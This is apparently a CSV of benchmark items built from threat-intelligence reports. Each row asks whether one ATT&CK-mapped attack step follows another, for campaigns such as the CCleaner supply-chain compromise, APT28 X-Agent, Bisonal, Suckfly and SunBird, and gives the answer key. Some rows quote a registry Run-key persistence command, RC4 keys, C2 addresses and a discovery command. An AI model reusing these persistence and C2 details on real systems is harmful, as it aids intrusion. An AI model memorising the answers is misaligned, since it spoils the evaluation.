2833,85,85-Defense Evasion-T1211-Exploitation for Defense Evasion,"After leveraging corrupted Flash vector objects for memory access and executing shellcode to make memory executable during the exploitation phase, is it likely that the zero-day exploit will bypass ASLR and DEP protections before attempting to bypass EAF mitigation as part of defense evasion?","Defense Evasion: The zero-day exploit bypasses both Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP). The exploit also attempts to bypass protections that use hardware breakpoints, such as EMET's EAF mitigation, by searching for and using specific APIs and gadgets during runtime ROP generation.","Execution: FireEye Research Labs identified a new Internet Explorer (IE) zero-day exploit used in targeted attacks. The exploit leverages a previously unknown use-after-free vulnerability, and uses a well-known Flash exploitation technique to achieve arbitrary memory access and bypass Windows' ASLR and DEP protections. The exploit involves preparing the heap with a Flash SWF file, triggering the IE bug via Javascript, and using corrupted Flash vector objects for memory access. Runtime ROP generation is used to search for specific APIs and construct a ROP chain, which is then used to execute shellcode that makes memory executable and clears debug registers, possibly to bypass EMET's EAF mitigation. The shellcode also downloads the next stage of the payload.
Others: The vulnerability, identified as CVE-2014-1776, affects IE6 through IE11, but the attack is targeting IE9 through IE11. Microsoft has released a security advisory to track this issue. The threat actors are actively using this exploit in an ongoing campaign named 'Operation Clandestine Fox.' The vulnerable versions of IE represent about a quarter of the total browser market. Mitigation measures include using EMET, which may break the exploit, and Enhanced Protected Mode in IE. Additionally, the attack will not work without Adobe Flash, so disabling the Flash plugin within IE will prevent the exploit from functioning. The APT group responsible for this exploit has a history of accessing browser-based 0-day exploits and is proficient at lateral movement without reusing command and control infrastructure. They have used backdoors like Pirpi in the past.",Yes,Op_Clandestine_Fox
2837,86,86-Command and Control-T1071-Application Layer Protocol,"Following the malware's discovery of system information and process lists via the 'cmd.exe /c tasklist & systeminfo' command, is it likely that the malware will use HTTPS communication as part of its command and control operations?","Command and Control: The malware contacts the command and control server using HTTPS communication with a POST method. Another file, 'sdbn.dll', contacts the domain 'marina-info.net', which is a reference to the Italian Marina Militare. The domain resolves to the IP '191.101.31.250' located in Holland. The communication is managed with a script written in the AutoIt language, embedded in the 'upnphost.exe' file as a resource.","Initial Access: Recently, a new series of malware samples were submitted to major online sandboxes, with one sample submitted to Virus Total attributed to the Russian APT28 group. The attack analyzed is multi-stage, with an initial dropper malware written in Delphi programming language downloading a second stage payload from the internet and executing it. The payload communicates with the server using the HTTPS protocol.
Execution: The malware initiates contact with the command and control server, downloading the file 'upnphost.exe' to the path '%APPDATA%\Local\Temp', which is likely the final payload. The executable implements a persistence mechanism by setting a registry key.
Persistence: The executable 'upnphost.exe' implements a persistence mechanism by setting a registry key to maintain its foothold on the system.
Defense Evasion: The 'upnphost.exe' file was submitted to Virus Total, likely due to the evasion technique implemented by the dropper. To analyze the dropper, it was patched, revealing the complete malicious behavior of the malware.
Discovery: The malware sends information gathered on the operating system to the IP '45.124.132.127' using the command line 'cmd.exe /c tasklist & systeminfo'. The server is located in Hong Kong according to WHOIS records.
Others: The attack threat map indicates the attack surface covered by the hacker group is wide, with C2Cs in Europe and China. Yara rules are provided for the dropper, first payload 'upnphost.exe', and second payload 'sdbn.dll' associated with APT28 XAGENT July 2018.",Yes,20180713_CSE_APT28_X-Agent_Op-Roman Holiday-Report_v6_1
2839,86,86-Discovery-T1614-System Location Discovery,"After evading defenses through the analyzed dropper and persisting in the system with the 'upnphost.exe' executable by setting a registry key, is it likely that APT28 will gather system information and send it to a server located in Hong Kong for Discovery purposes?",Discovery: The malware sends information gathered on the operating system to the IP '45.124.132.127' using the command line 'cmd.exe /c tasklist & systeminfo'. The server is located in Hong Kong according to WHOIS records.,"Initial Access: Recently, a new series of malware samples were submitted to major online sandboxes, with one sample submitted to Virus Total attributed to the Russian APT28 group. The attack analyzed is multi-stage, with an initial dropper malware written in Delphi programming language downloading a second stage payload from the internet and executing it. The payload communicates with the server using the HTTPS protocol.
Execution: The malware initiates contact with the command and control server, downloading the file 'upnphost.exe' to the path '%APPDATA%\Local\Temp', which is likely the final payload. The executable implements a persistence mechanism by setting a registry key.
Persistence: The executable 'upnphost.exe' implements a persistence mechanism by setting a registry key to maintain its foothold on the system.
Defense Evasion: The 'upnphost.exe' file was submitted to Virus Total, likely due to the evasion technique implemented by the dropper. To analyze the dropper, it was patched, revealing the complete malicious behavior of the malware.
Command and Control: The malware contacts the command and control server using HTTPS communication with a POST method. Another file, 'sdbn.dll', contacts the domain 'marina-info.net', which is a reference to the Italian Marina Militare. The domain resolves to the IP '191.101.31.250' located in Holland. The communication is managed with a script written in the AutoIt language, embedded in the 'upnphost.exe' file as a resource.
Others: The attack threat map indicates the attack surface covered by the hacker group is wide, with C2Cs in Europe and China. Yara rules are provided for the dropper, first payload 'upnphost.exe', and second payload 'sdbn.dll' associated with APT28 XAGENT July 2018.",Yes,20180713_CSE_APT28_X-Agent_Op-Roman Holiday-Report_v6_1
2843,87,87-Command and Control-T1095-Non-Application Layer Protocol,"After MSIL/Crimson successfully executes on the victim's machine by decoding and executing its downloader payload, is it likely that the malware will utilize a custom TCP protocol to communicate with its command and control (C&C) servers before relying on the RAT component for information exfiltration?","Command and Control: The MSIL/Crimson malware utilizes a custom TCP protocol for communicating with its command and control (C&C) servers. Some of its modules, which lack C&C capability, rely on the RAT component for information exfiltration.","Initial Access: On February 11, 2016, two malicious emails were sent minutes apart to officials at Indian embassies in Saudi Arabia and Kazakhstan from the same originating IP address (5.189.145[.]248) belonging to Contabo GmbH. Both emails carried the same attachment, a weaponized RTF document exploiting CVE-2012-0158 to drop an embedded, encoded portable executable (PE) named svchost.exe with downloader functionality.
Execution: After successful exploitation and decoding of the embedded payload, a family of malware referred to as MSIL/Crimson is executed on the victim's machine. The first stage is a downloader whose purpose is to download the more fully featured RAT component. The MSIL/Crimson downloader attempts to download the full RAT from 213.136.87[.]122:10001.
Others: Proofpoint researchers uncovered an advanced persistent threat (APT) against Indian diplomatic and military resources, which they have dubbed 'Operation Transparent Tribe.' The investigation began with malicious emails and uncovered connections to watering hole sites designed to drop a remote access Trojan (RAT) with data exfiltration functions. The campaigns and attacks appear related by common indicators of compromise (IOCs), vectors, payloads, and language. The exact nature and attribution of this APT remain under investigation. The MSIL/Crimson malware family is modular, with additional payloads downloaded by the main RAT module often utilized for functions such as keylogging and browser credential theft. Infections typically occur in stages, with the first stage being a downloader component. Crimson-infected victims may be spied on via invasive methods such as through their webcam, stealing email from Outlook, and recording their screen. Some variants support at least 40 individual commands. The technical analysis section provides a full description and analysis of the MSIL/Crimson malware family.",Yes,transparent-tribe-threat-insight-en2020
2847,88,88-Defense Evasion-T1562-Impair Defenses,"After executing a PowerShell command to download and execute a batch file, is Asruex malware likely to detect anti-virus software to evade detection before retrieving an image file with encoded malware from the C&C server for decoding and execution?","Defense Evasion: Asruex malware has anti-analysis features, including the ability to detect virtual machines and stop running if such an environment is detected. It also has the capability to detect anti-virus software.","Initial Access: JPCERT/CC has been tracking malicious shortcut files sent as email attachments targeting specific organizations since around October 2015. These shortcut files, when opened, infect the host with Asruex malware, which has remote control capabilities. The attackers, associated with the group 'DarkHotel', use this method to attempt network intrusion.
Execution: Upon opening the malicious shortcut file, a PowerShell command is executed to download a batch file from a URL, which then executes PowerShell scripts to download a Windows executable (downloader) and a decoy document. The decoy documents are in Japanese and Chinese, indicating a broader target range.
Command and Control: The downloader retrieves an image file containing encoded Asruex malware, which is then decoded and executed. Asruex communicates with a C&C server over HTTP and executes commands received. It operates based on configuration information stored within, including C&C servers, dummy hosts, version information, and a key for decoding data.
Others: Asruex is a relatively new malware observed since October 2015, likely to be used in continued targeted attacks. The malware downloads and executes AdvProv.dll, a plug-in that expands Asruex's functions, including file manipulation and registry operations. Hash values of artifacts and destination URLs used by Asruex are provided for security measures.",Yes,asruex-malware-infecting-through-shortcut-files.html
2849,88,88-Command and Control-T1132-Data Encoding,"After PowerShell scripts download a Windows executable and a decoy document during the execution phase, is it likely that the downloader will retrieve an image file containing encoded Asruex malware during the command and control phase?","Command and Control: The downloader retrieves an image file containing encoded Asruex malware, which is then decoded and executed. Asruex communicates with a C&C server over HTTP and executes commands received. It operates based on configuration information stored within, including C&C servers, dummy hosts, version information, and a key for decoding data.","Initial Access: JPCERT/CC has been tracking malicious shortcut files sent as email attachments targeting specific organizations since around October 2015. These shortcut files, when opened, infect the host with Asruex malware, which has remote control capabilities. The attackers, associated with the group 'DarkHotel', use this method to attempt network intrusion.
Execution: Upon opening the malicious shortcut file, a PowerShell command is executed to download a batch file from a URL, which then executes PowerShell scripts to download a Windows executable (downloader) and a decoy document. The decoy documents are in Japanese and Chinese, indicating a broader target range.
Defense Evasion: Asruex malware has anti-analysis features, including the ability to detect virtual machines and stop running if such an environment is detected. It also has the capability to detect anti-virus software.
Others: Asruex is a relatively new malware observed since October 2015, likely to be used in continued targeted attacks. The malware downloads and executes AdvProv.dll, a plug-in that expands Asruex's functions, including file manipulation and registry operations. Hash values of artifacts and destination URLs used by Asruex are provided for security measures.",Yes,asruex-malware-infecting-through-shortcut-files.html
2854,89,89-Discovery-T1046-Network Service Discovery,"Is it likely that Suckfly will use a signed credential-dumping tool to obtain the victim's account credentials during Credential Access before scanning the corporate internal network for hosts with ports 8080, 5900, and 40 open as part of Discovery?","Discovery: Suckfly scanned the corporate internal network for hosts with ports 8080, 5900, and 40 open, looking to expand its foothold on the e-commerce company's internal network.","Initial Access: Suckfly exploited a vulnerability on the targeted employee's operating system (Windows) that allowed the attackers to bypass the User Account Control and install the Nidiran back door to provide access for their attack. While the delivery vector is unknown, a spear-phishing email may have been used due to the target's extensive open-source presence.
Execution: Suckfly used the Nidiran back door along with a number of hacktools to infect the victim's internal hosts. The tools and malware used in this breach were also signed with stolen digital certificates.
Privilege Escalation: Suckfly used a signed credential-dumping tool to obtain the victim's account credentials, allowing them to navigate the internal corporate network as though they were the employee.
Defense Evasion: Suckfly made its malware difficult to analyze to prevent their operations from being detected. The malware checks for an internet connection before running and attempts to communicate with the C&C domain over ports 443 and 8443.
Credential Access: Suckfly used a signed credential-dumping tool to obtain the victim's account credentials.
Lateral Movement: Suckfly used hacktools to move laterally and escalate privileges within the e-commerce company's internal network.
Command and Control: Suckfly's Nidiran back door communicated with the C&C domains, sending encrypted and hardcoded information including the network name, hostname, IP address, and the victim's operating system information.
Exfiltration: Suckfly's final step was to exfiltrate data off the victim’s network and onto Suckfly’s infrastructure using the Nidiran back door. The extent of stolen information is unknown.
Others: Suckfly conducted long-term espionage campaigns against government and commercial organizations in India, targeting high-profile entities such as government networks, a large e-commerce company, and its primary shipping vendor, one of India's top five IT firms, a US healthcare provider's Indian business unit, and two government organizations. The attacks were part of a planned operation against specific targets in India, with the government organizations showing a higher infection rate. Suckfly's activities suggest it is a professional organized group, operating Monday through Friday, and likely providing economic insight to the organization behind its operations. Symantec has detections in place to protect against Suckfly's malware.",Yes,indian-organizations-targeted-suckfly-attacks
2856,89,89-Privilege Escalation-T1078-Valid Accounts,"After using the Nidiran back door and hacktools to infect the victim's internal hosts, and prior to scanning the corporate internal network for open ports to expand foothold, is Suckfly likely to use a signed credential-dumping tool to obtain the victim's account credentials and navigate the internal corporate network?","Privilege Escalation: Suckfly used a signed credential-dumping tool to obtain the victim's account credentials, allowing them to navigate the internal corporate network as though they were the employee.","Initial Access: Suckfly exploited a vulnerability on the targeted employee's operating system (Windows) that allowed the attackers to bypass the User Account Control and install the Nidiran back door to provide access for their attack. While the delivery vector is unknown, a spear-phishing email may have been used due to the target's extensive open-source presence.
Execution: Suckfly used the Nidiran back door along with a number of hacktools to infect the victim's internal hosts. The tools and malware used in this breach were also signed with stolen digital certificates.
Defense Evasion: Suckfly made its malware difficult to analyze to prevent their operations from being detected. The malware checks for an internet connection before running and attempts to communicate with the C&C domain over ports 443 and 8443.
Credential Access: Suckfly used a signed credential-dumping tool to obtain the victim's account credentials.
Discovery: Suckfly scanned the corporate internal network for hosts with ports 8080, 5900, and 40 open, looking to expand its foothold on the e-commerce company's internal network.
Lateral Movement: Suckfly used hacktools to move laterally and escalate privileges within the e-commerce company's internal network.
Command and Control: Suckfly's Nidiran back door communicated with the C&C domains, sending encrypted and hardcoded information including the network name, hostname, IP address, and the victim's operating system information.
Exfiltration: Suckfly's final step was to exfiltrate data off the victim’s network and onto Suckfly’s infrastructure using the Nidiran back door. The extent of stolen information is unknown.
Others: Suckfly conducted long-term espionage campaigns against government and commercial organizations in India, targeting high-profile entities such as government networks, a large e-commerce company, and its primary shipping vendor, one of India's top five IT firms, a US healthcare provider's Indian business unit, and two government organizations. The attacks were part of a planned operation against specific targets in India, with the government organizations showing a higher infection rate. Suckfly's activities suggest it is a professional organized group, operating Monday through Friday, and likely providing economic insight to the organization behind its operations. Symantec has detections in place to protect against Suckfly's malware.",Yes,indian-organizations-targeted-suckfly-attacks
2858,89,89-Lateral Movement-T1210-Exploitation of Remote Services,"After Suckfly scanned the corporate internal network for hosts with ports 8080, 5900, and 40 open to expand its foothold on the e-commerce company's internal network, is it likely that Suckfly used hacktools to move laterally and escalate privileges within the internal network before their C2 communication sent encrypted and hardcoded data using the Nidiran back door?",Lateral Movement: Suckfly used hacktools to move laterally and escalate privileges within the e-commerce company's internal network.,"Initial Access: Suckfly exploited a vulnerability on the targeted employee's operating system (Windows) that allowed the attackers to bypass the User Account Control and install the Nidiran back door to provide access for their attack. While the delivery vector is unknown, a spear-phishing email may have been used due to the target's extensive open-source presence.
Execution: Suckfly used the Nidiran back door along with a number of hacktools to infect the victim's internal hosts. The tools and malware used in this breach were also signed with stolen digital certificates.
Privilege Escalation: Suckfly used a signed credential-dumping tool to obtain the victim's account credentials, allowing them to navigate the internal corporate network as though they were the employee.
Defense Evasion: Suckfly made its malware difficult to analyze to prevent their operations from being detected. The malware checks for an internet connection before running and attempts to communicate with the C&C domain over ports 443 and 8443.
Credential Access: Suckfly used a signed credential-dumping tool to obtain the victim's account credentials.
Discovery: Suckfly scanned the corporate internal network for hosts with ports 8080, 5900, and 40 open, looking to expand its foothold on the e-commerce company's internal network.
Command and Control: Suckfly's Nidiran back door communicated with the C&C domains, sending encrypted and hardcoded information including the network name, hostname, IP address, and the victim's operating system information.
Exfiltration: Suckfly's final step was to exfiltrate data off the victim’s network and onto Suckfly’s infrastructure using the Nidiran back door. The extent of stolen information is unknown.
Others: Suckfly conducted long-term espionage campaigns against government and commercial organizations in India, targeting high-profile entities such as government networks, a large e-commerce company, and its primary shipping vendor, one of India's top five IT firms, a US healthcare provider's Indian business unit, and two government organizations. The attacks were part of a planned operation against specific targets in India, with the government organizations showing a higher infection rate. Suckfly's activities suggest it is a professional organized group, operating Monday through Friday, and likely providing economic insight to the organization behind its operations. Symantec has detections in place to protect against Suckfly's malware.",Yes,indian-organizations-targeted-suckfly-attacks
2861,9,9-Execution-T1106-Native API,Is it likely that the CCleaner binary will execute malicious code by calling CC_InfectionBase(0x0040102C) and initiating decryption of the malicious payload after being downloaded as part of a compromised CCleaner 5.33 installation package signed with a valid digital certificate?,"Execution: The malicious 32-bit CCleaner binary from the installer for version 5.33 was modified to call to the code at CC_InfectionBase(0x0040102C), redirecting code execution flow to the malicious code. This initiated the decryption of data containing two stages of the malicious payload: a Position Independent Code (PIC) PE loader and a DLL file functioning as the malware payload. The malware author attempted to evade detection by zeroing out the IMAGE_DOS_HEADER. The binary created an executable heap, copied the decrypted malware to it, and then called the PE loader to begin its operation. After initiating the infection process, the binary erased the memory regions containing the PE loader and the DLL file, destroyed the heap, and continued with normal CCleaner operations.","Initial Access: The CTI report from September 18, 2017, authored by Edmund Brumaghin and others from Cisco's Talos Intelligence Group, details a supply chain attack where the download servers of the software vendor Avast were compromised to distribute a malicious version of CCleaner. The affected version, CCleaner 5.33, released on August 15, 2017, contained a multi-stage malware payload. The 32-bit CCleaner binary included in the installer had been modified to execute malicious code before proceeding with the normal CCleaner operations. This version was hosted on CCleaner's download server until September 11, 2017, and was signed with a valid certificate issued to Piriform Ltd by Symantec, valid through October 10, 2018. A second malicious sample was also discovered, signed approximately 15 minutes after the first one.
Defense Evasion: The malware payload within CCleaner 5.33 attempted to evade detection by zeroing out the IMAGE_DOS_HEADER and using a valid digital signature. The malicious DLL file, CBkdr.dll, was modified to avoid detection, and the DLLEntryPoint created an execution thread to return control to the loader. This thread was responsible for calling CCBkdr_GetShellcodeFromC2AndCall and setting up a Return Oriented Programming (ROP) chain to deallocate memory associated with the DLL and exit the thread.
Command and Control: The malware established a Command and Control (C2) channel by encrypting and encoding system information using modified Base64, then transmitting it via an HTTPS POST request to 216[.]126[.]225[.]148. The communications leveraged a hardcoded HTTP Host header set to speccy[.]piriform[.]com and ignored security errors from the server's self-signed SSL certificate. If no response was received from the C2 server, the malware fell back to a Domain Generation Algorithm (DGA). The malware stored the C2 IP address and the current system time plus two days in the registry at HKLM\SOFTWARE\Piriform\Agomo:NID and HKLM\SOFTWARE\Piriform\Agomo:TCID, respectively.
Impact: The impact of the attack could be severe due to the high number of systems potentially affected. CCleaner claimed over 2 billion downloads worldwide as of November 2016. Affected systems needed to be restored to a state before August 15, 2017, or reinstalled, and users were advised to update to the latest version of CCleaner, which at the time of the report was version 5.34.
Others: The CTI report includes additional information about the investigation and response to the threat. Cisco Talos released ClamAV signatures 6336251 and 6336252 to detect the threat. Advanced Malware Protection (AMP), Cisco's Web Security Appliance (WSA), AMP Threat Grid, and Umbrella were recommended for protection against the threat. Indicators of Compromise (IoCs) were provided, including file hashes, DGA domains, and IP addresses. The report also noted that antivirus detection for this threat was low at the time of writing.",Yes,CCleanup
2864,9,9-Command and Control-T1573-Encrypted Channel,"After modifying the CCleaner binary to execute malicious code and decrypting the multi-stage payload as part of the execution phase, is it likely that the malware would establish a Command and Control (C2) channel using encrypted and encoded system information sent via HTTPS POST requests?","Command and Control: The malware established a Command and Control (C2) channel by encrypting and encoding system information using modified Base64, then transmitting it via an HTTPS POST request to 216[.]126[.]225[.]148. The communications leveraged a hardcoded HTTP Host header set to speccy[.]piriform[.]com and ignored security errors from the server's self-signed SSL certificate. If no response was received from the C2 server, the malware fell back to a Domain Generation Algorithm (DGA). The malware stored the C2 IP address and the current system time plus two days in the registry at HKLM\SOFTWARE\Piriform\Agomo:NID and HKLM\SOFTWARE\Piriform\Agomo:TCID, respectively.","Initial Access: The CTI report from September 18, 2017, authored by Edmund Brumaghin and others from Cisco's Talos Intelligence Group, details a supply chain attack where the download servers of the software vendor Avast were compromised to distribute a malicious version of CCleaner. The affected version, CCleaner 5.33, released on August 15, 2017, contained a multi-stage malware payload. The 32-bit CCleaner binary included in the installer had been modified to execute malicious code before proceeding with the normal CCleaner operations. This version was hosted on CCleaner's download server until September 11, 2017, and was signed with a valid certificate issued to Piriform Ltd by Symantec, valid through October 10, 2018. A second malicious sample was also discovered, signed approximately 15 minutes after the first one.
Execution: The malicious 32-bit CCleaner binary from the installer for version 5.33 was modified to call to the code at CC_InfectionBase(0x0040102C), redirecting code execution flow to the malicious code. This initiated the decryption of data containing two stages of the malicious payload: a Position Independent Code (PIC) PE loader and a DLL file functioning as the malware payload. The malware author attempted to evade detection by zeroing out the IMAGE_DOS_HEADER. The binary created an executable heap, copied the decrypted malware to it, and then called the PE loader to begin its operation. After initiating the infection process, the binary erased the memory regions containing the PE loader and the DLL file, destroyed the heap, and continued with normal CCleaner operations.
Defense Evasion: The malware payload within CCleaner 5.33 attempted to evade detection by zeroing out the IMAGE_DOS_HEADER and using a valid digital signature. The malicious DLL file, CBkdr.dll, was modified to avoid detection, and the DLLEntryPoint created an execution thread to return control to the loader. This thread was responsible for calling CCBkdr_GetShellcodeFromC2AndCall and setting up a Return Oriented Programming (ROP) chain to deallocate memory associated with the DLL and exit the thread.
Impact: The impact of the attack could be severe due to the high number of systems potentially affected. CCleaner claimed over 2 billion downloads worldwide as of November 2016. Affected systems needed to be restored to a state before August 15, 2017, or reinstalled, and users were advised to update to the latest version of CCleaner, which at the time of the report was version 5.34.
Others: The CTI report includes additional information about the investigation and response to the threat. Cisco Talos released ClamAV signatures 6336251 and 6336252 to detect the threat. Advanced Malware Protection (AMP), Cisco's Web Security Appliance (WSA), AMP Threat Grid, and Umbrella were recommended for protection against the threat. Indicators of Compromise (IoCs) were provided, including file hashes, DGA domains, and IP addresses. The report also noted that antivirus detection for this threat was low at the time of writing.",Yes,CCleanup
2870,90,90-Collection-T1560-Archive Collected Data,"After the Lookout Threat Intelligence team discovered the Hornbill and SunBird Android surveillanceware used by the Confucius APT group, is it likely that SunBird exfiltrated data like call logs, geolocation, and WhatsApp voice notes by compressing it into ZIP files before uploading it to command and control servers through unique server paths?","Collection: The Lookout Threat Intelligence team discovered two novel Android surveillanceware, Hornbill and SunBird, believed to be used by the Confucius APT group. These tools can exfiltrate SMS, encrypted messaging app content, geolocation, call logs, contacts, device metadata, images, WhatsApp voice notes, and more. SunBird can also extract browser history, calendar information, and content from various messaging applications. Data is collected in SQLite databases, compressed into ZIP files, and uploaded to C2 servers. Hornbill focuses on WhatsApp communications, recording calls, and monitoring document activity on external storage. Data is stored in hidden folders and uploaded to C2 infrastructure, with server paths indicating communication with C2 servers.","Command and Control: SunBird uploads data to command and control (C2) servers at regular intervals, while Hornbill only uploads when data changes. SunBird's C2 infrastructure was insecurely configured, exposing over 18GB of exfiltrated data. The malware uses unique server paths for communication with C2 servers, and the operators behind Hornbill are particularly interested in WhatsApp communications. The C2 domains pieupdate[.]online and samaatv[.]online are associated with Confucius APT infrastructure.
Exfiltration: SunBird exfiltrated various types of data, including call logs, contacts, device metadata, geolocation, images, WhatsApp voice notes, browser history, calendar information, and content from messaging applications. The malware collected data in SQLite databases, compressed it into ZIP files, and uploaded it to C2 servers. Hornbill exfiltrated data when initially run and then only when changes occurred. Data was stored in hidden folders on external storage and uploaded to C2 infrastructure.
Others: The Lookout Threat Intelligence team identified Hornbill and SunBird as novel Android surveillanceware linked to the Confucius APT group, active since 2013 and associated with pro-India state-sponsored activities targeting Pakistani and South Asian entities. The malware impersonates legitimate applications and has been found on third-party app stores. The exfiltrated data from C2 servers revealed targeting of individuals linked to Pakistan's military, nuclear authorities, and Indian election officials in Kashmir. The malware's development timeline suggests activity as early as December 2016, with recent samples from December 2020 indicating ongoing deployment. The Confucius group's tactics include impersonating chat applications and using unique server paths for C2 communication. The malware has not been distributed through Google Play, and Lookout security apps protect users from these threats.",Yes,Novel Confucius APT Android Spyware Linked to India-Pakistan Conflict
2872,90,90-Exfiltration-T1041-Exfiltration Over C2 Channel,"After collecting data in SQLite databases, compressing it into ZIP files, and storing it in hidden folders on external storage, is it likely that SunBird and Hornbill will exfiltrate this data over C2 channels to their command and control servers before the C2 infrastructure is utilized to store or expose the exfiltrated data?","Exfiltration: SunBird exfiltrated various types of data, including call logs, contacts, device metadata, geolocation, images, WhatsApp voice notes, browser history, calendar information, and content from messaging applications. The malware collected data in SQLite databases, compressed it into ZIP files, and uploaded it to C2 servers. Hornbill exfiltrated data when initially run and then only when changes occurred. Data was stored in hidden folders on external storage and uploaded to C2 infrastructure.","Collection: The Lookout Threat Intelligence team discovered two novel Android surveillanceware, Hornbill and SunBird, believed to be used by the Confucius APT group. These tools can exfiltrate SMS, encrypted messaging app content, geolocation, call logs, contacts, device metadata, images, WhatsApp voice notes, and more. SunBird can also extract browser history, calendar information, and content from various messaging applications. Data is collected in SQLite databases, compressed into ZIP files, and uploaded to C2 servers. Hornbill focuses on WhatsApp communications, recording calls, and monitoring document activity on external storage. Data is stored in hidden folders and uploaded to C2 infrastructure, with server paths indicating communication with C2 servers.
Command and Control: SunBird uploads data to command and control (C2) servers at regular intervals, while Hornbill only uploads when data changes. SunBird's C2 infrastructure was insecurely configured, exposing over 18GB of exfiltrated data. The malware uses unique server paths for communication with C2 servers, and the operators behind Hornbill are particularly interested in WhatsApp communications. The C2 domains pieupdate[.]online and samaatv[.]online are associated with Confucius APT infrastructure.
Others: The Lookout Threat Intelligence team identified Hornbill and SunBird as novel Android surveillanceware linked to the Confucius APT group, active since 2013 and associated with pro-India state-sponsored activities targeting Pakistani and South Asian entities. The malware impersonates legitimate applications and has been found on third-party app stores. The exfiltrated data from C2 servers revealed targeting of individuals linked to Pakistan's military, nuclear authorities, and Indian election officials in Kashmir. The malware's development timeline suggests activity as early as December 2016, with recent samples from December 2020 indicating ongoing deployment. The Confucius group's tactics include impersonating chat applications and using unique server paths for C2 communication. The malware has not been distributed through Google Play, and Lookout security apps protect users from these threats.",Yes,Novel Confucius APT Android Spyware Linked to India-Pakistan Conflict
2875,91,91-Command and Control-T1573-Encrypted Channel,"After using RC4 cipher with the key ""78563412"" for encrypting C2 address strings in the defense evasion phase, is the Bisonal malware likely to initiate communication with its C2 server using HTTP POST requests encrypted with the RC4 cipher in the command and control phase?","Command and Control: The Bisonal variant used in the latest attack communicates with C2 addresses using the HTTP POST method. When this Bisonal variant communicates with its C2, the malware sends an HTTP POST request with static strings and the IP address of the compromised machine. The malware sends hardcoded DWORD values (0x10000 and 0x3E7) just for the initial connection and receives updated values from the C2 and uses them for further communication. All communications between this Bisonal variant and C2 are encrypted by the RC4 cipher with the static key ""78563412"". The backdoor always sends identical eight bytes of data (81b2a8977ea31b91) to the C2 first. The C2 replies with a session id number and backdoor command, which is consistent throughout the C2 communication. The malware then processes the given command on the compromised system and sends the result back to C2 with the session id number and the backdoor command number. The C2 replies with that same session id number. The backdoor waits five seconds and restarts communication with the C2 with the same session id number.","Initial Access: In early May, Unit 42 discovered an attack campaign against at least one defense company in Russia and one unidentified organization in South Korea delivering a variant of Bisonal malware. The adversary behind these attacks lured the targets into launching the Microsoft Windows executable malware by masquerading it as a PDF file (using a fake PDF icon) and reusing publicly available data for the decoy PDF file's contents. The spear-phishing email sent to the target organization was spoofed to look like it was sent from Rostec, a Russian state corporation. The email included project details aimed at improving the housing conditions of defense industry workers. The malicious executable attachment, once opened, dropped the main payload on the victim machine and displayed a decoy file to the victim, which matched an article published on Rostec's website on January 30, 2018.
Persistence: The dropper executable file in the Russian attack hides the encrypted Bisonal DLL file and non-malicious decoy file at the end of its body. Once executed, the dropper decrypts the data blob using the RC4 cipher with the key, ""34123412"", saves them in the path shown below and executes them. The dropper then creates the following registry entry to execute the Bisonal sample when the computer reboots: HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\""vert"" = ""rundll32.exe c:\windows\temp\pvcu.dll , Qszdez""
Defense Evasion: The Bisonal malware in the Russian attack used a different cipher for C2 communication than other publicly documented samples. It employs the RC4 cipher with the key ""78563412"" for encrypting C2 address strings. The malware variant communicates with one of the following hard-coded C2 addresses by using the HTTP POST method on TCP port 443: kted56erhg.dynssl[.]com and euiro8966.organiccrap[.]com, both resolving to the same IP address, 116.193.155[.]38. The initial HTTP POST request to the C2 server contains static strings ""ks8d"" and ""akspbu.txt"", and the IP address of the compromised machine. The User Agent request header is incomplete, which can be a good indicator in network logs for a possible Bisonal infection.",Yes,bisonal-malware-used-attacks-russia-south-korea
2877,91,91-Initial Access-T1566-Phishing,"Before achieving persistence by creating a registry entry to execute the Bisonal sample on reboot, is it likely that the adversary lured the targets into launching the Microsoft Windows executable malware masquerading as a PDF file using a spear-phishing email spoofed to look like it was sent from Rostec?","Initial Access: In early May, Unit 42 discovered an attack campaign against at least one defense company in Russia and one unidentified organization in South Korea delivering a variant of Bisonal malware. The adversary behind these attacks lured the targets into launching the Microsoft Windows executable malware by masquerading it as a PDF file (using a fake PDF icon) and reusing publicly available data for the decoy PDF file's contents. The spear-phishing email sent to the target organization was spoofed to look like it was sent from Rostec, a Russian state corporation. The email included project details aimed at improving the housing conditions of defense industry workers. The malicious executable attachment, once opened, dropped the main payload on the victim machine and displayed a decoy file to the victim, which matched an article published on Rostec's website on January 30, 2018.","Persistence: The dropper executable file in the Russian attack hides the encrypted Bisonal DLL file and non-malicious decoy file at the end of its body. Once executed, the dropper decrypts the data blob using the RC4 cipher with the key, ""34123412"", saves them in the path shown below and executes them. The dropper then creates the following registry entry to execute the Bisonal sample when the computer reboots: HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\""vert"" = ""rundll32.exe c:\windows\temp\pvcu.dll , Qszdez""
Defense Evasion: The Bisonal malware in the Russian attack used a different cipher for C2 communication than other publicly documented samples. It employs the RC4 cipher with the key ""78563412"" for encrypting C2 address strings. The malware variant communicates with one of the following hard-coded C2 addresses by using the HTTP POST method on TCP port 443: kted56erhg.dynssl[.]com and euiro8966.organiccrap[.]com, both resolving to the same IP address, 116.193.155[.]38. The initial HTTP POST request to the C2 server contains static strings ""ks8d"" and ""akspbu.txt"", and the IP address of the compromised machine. The User Agent request header is incomplete, which can be a good indicator in network logs for a possible Bisonal infection.
Command and Control: The Bisonal variant used in the latest attack communicates with C2 addresses using the HTTP POST method. When this Bisonal variant communicates with its C2, the malware sends an HTTP POST request with static strings and the IP address of the compromised machine. The malware sends hardcoded DWORD values (0x10000 and 0x3E7) just for the initial connection and receives updated values from the C2 and uses them for further communication. All communications between this Bisonal variant and C2 are encrypted by the RC4 cipher with the static key ""78563412"". The backdoor always sends identical eight bytes of data (81b2a8977ea31b91) to the C2 first. The C2 replies with a session id number and backdoor command, which is consistent throughout the C2 communication. The malware then processes the given command on the compromised system and sends the result back to C2 with the session id number and the backdoor command number. The C2 replies with that same session id number. The backdoor waits five seconds and restarts communication with the C2 with the same session id number.",Yes,bisonal-malware-used-attacks-russia-south-korea
